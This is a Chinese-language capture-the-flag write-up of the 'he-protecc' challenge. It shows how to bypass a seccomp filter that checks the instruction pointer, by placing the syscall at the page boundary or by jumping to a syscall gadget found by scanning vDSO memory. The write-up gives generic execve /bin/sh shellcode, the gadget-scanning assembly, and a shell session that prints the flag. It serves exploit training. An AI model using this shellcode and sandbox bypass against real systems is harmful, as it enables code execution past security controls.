# 思路
- rip > 0x00500fff, rip = 0x501000
- ig seccomp instruction_pointer points to the next instruction,so if you put syscall at the end it points outside the area
- at the end RIP --> 0x501000, which is in the allowed range. 
# 题目描述
```
I was trying to access the corn bank, but the access seems to be restricted somehow. Can you help me?

Note: the compose.yml file is provided just for convenience, and is not strictly necessary to solve the challenge.

ncat --ssl he-protecc.challs.cornc.tf 1337
```

# 知识点
## mmap
```
 0x40330d <main+109>    call   mmap64                      <mmap64>
        addr: 0x500000
        len: 0x1000
        prot: 7
        flags: 0x22
        fd: 0xffffffff
        offset: 0
```

## seccomp
```
(pip_venv) ➜  heprotecc seccomp-tools dump ./protected
How long is your shellcode?
0
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000008  A = instruction_pointer
 0001: 0x01 0x00 0x00 0x003fffff  X = 4194303
 0002: 0x2d 0x00 0x0a 0x00000000  if (A <= X) goto 0013
 0003: 0x01 0x00 0x00 0x004b7fff  X = 4947967
 0004: 0x2d 0x00 0x07 0x00000000  if (A <= X) goto 0012
 0005: 0x01 0x00 0x00 0x004fffff  X = 5242879
 0006: 0x2d 0x00 0x06 0x00000000  if (A <= X) goto 0013
 0007: 0x01 0x00 0x00 0x00500fff  X = 5246975
 0008: 0x2d 0x00 0x03 0x00000000  if (A <= X) goto 0012
 0009: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
 0010: 0x01 0x00 0x00 0x00007fff  X = 32767
 0011: 0x2d 0x00 0x01 0x00000000  if (A <= X) goto 0013
 0012: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

# getshell
```
[*] Switching to interactive mode
$ cat f*
[DEBUG] Sent 0x7 bytes:
    b'cat f*\n'
[DEBUG] Received 0x24 bytes:
    b'corn{W0w_5ucH_pr07ect1On!_0a1e3243}\n'
corn{W0w_5ucH_pr07ect1On!_0a1e3243}
[*] Got EOF while reading in interactive
```
![](https://r2.20161023.xyz/pic/20250622225524269.png)


# 通用shellcode
```
[+]    0:   48 31 c0                xor    rax, rax
       3:   50                      push   rax
       4:   48 bb 2f 2f 62 69 6e 2f 73 68   movabs rbx, 0x68732f6e69622f2f
       e:   53                      push   rbx
       f:   48 89 e7                mov    rdi, rsp
      12:   48 31 f6                xor    rsi, rsi
      15:   48 31 d2                xor    rdx, rdx
      18:   48 c7 c0 3b 00 00 00    mov    rax, 0x3b
      1f:   0f 05                   syscall

```


# 方法二知识点
寻找vdso地址，栈上一个是0x21
```
4a:0250│+218 0x7fffc5698468 ◂— 0
4b:0258│+220 0x7fffc5698470 ◂— 0x21 /* '!' */
4c:0260│+228 0x7fffc5698478 —▸ 0x7fffc57b3000 ◂— jg 0x7fffc57b3047
4d:0268│+230 0x7fffc5698480 ◂— 0x33 /* '3' */
4e:0270│+238 0x7fffc5698488 ◂— 0x7f0
4f:0278│+240 0x7fffc5698490 ◂— 0x10
pwndbg>
50:0280│+248 0x7fffc5698498 ◂— 0xbfebfbff
51:0288│+250 0x7fffc56984a0 ◂— 6
52:0290│+258 0x7fffc56984a8 ◂— 0x1000
53:0298│+260 0x7fffc56984b0 ◂— 0x11
54:02a0│+268 0x7fffc56984b8 ◂— 0x64 /* 'd' */
55:02a8│+270 0x7fffc56984c0 ◂— 3
56:02b0│+278 0x7fffc56984c8 —▸ 0x400040 ◂— 0x400000001
57:02b8│+280 0x7fffc56984d0 ◂— 4
pwndbg>
58:02c0│+288 0x7fffc56984d8 ◂— 0x38 /* '8' */
59:02c8│+290 0x7fffc56984e0 ◂— 5
5a:02d0│+298 0x7fffc56984e8 ◂— 0xb /* '\x0b' */
5b:02d8│+2a0 0x7fffc56984f0 ◂— 7
5c:02e0│+2a8 0x7fffc56984f8 ◂— 0
5d:02e8│+2b0 0x7fffc5698500 ◂— 8
5e:02f0│+2b8 0x7fffc5698508 ◂— 0
5f:02f8│+2c0 0x7fffc5698510 ◂— 9 /* '\t' */
pwndbg> vmmap 0x7fffc57b3000
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File (set vmmap-prefer-relpaths on)
    0x7fffc57af000     0x7fffc57b3000 r--p     4000      0 [vvar]
►   0x7fffc57b3000     0x7fffc57b5000 r-xp     2000      0 [vdso] +0x0
pwndbg>
```
![](https://r2.20161023.xyz/pic/20250623155319133.png)



# vdso
0x50f就是syscall，在vdso区域寻找syscall，然后设置好寄存器值，最后jmp r8，执行syscall

```
.loop_vdso:
    add r8, 1
    xor rax, rax
    mov ax, word ptr [r8]
    sub rax, 0x50f
    test rax, rax
    jne .loop_vdso
```

![](https://r2.20161023.xyz/pic/20250623155519927.png)

# 参考
方法二学习自`4ncicentH`
![](https://r2.20161023.xyz/pic/20250623160018545.png)